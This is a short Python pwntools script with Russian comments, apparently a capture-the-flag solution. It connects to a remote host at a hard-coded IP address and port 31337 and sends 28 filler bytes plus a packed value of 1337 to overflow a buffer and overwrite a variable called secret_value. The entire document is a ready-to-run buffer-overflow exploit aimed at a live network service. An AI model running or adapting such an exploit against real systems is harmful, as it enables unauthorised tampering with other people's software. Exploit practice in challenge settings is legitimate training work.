from pwn import *

# target = process("./main")  # Путь к исполняемому файлу
target = remote("185.154.193.106", 31337)
context.log_level = "debug"

# Определить значение, которое мы хотим записать вместо secret_value
new_secret_value = 1337

# Создать payload для перезаписи secret_value
payload = b"A" * 28  # Заполняем буфер
payload += p32(new_secret_value)  # Перезаписываем secret_value на новое значение

# Отправляем payload на программу
target.sendline(payload)

# Получаем вывод программы после отправки payload
print(target.recvall().decode())
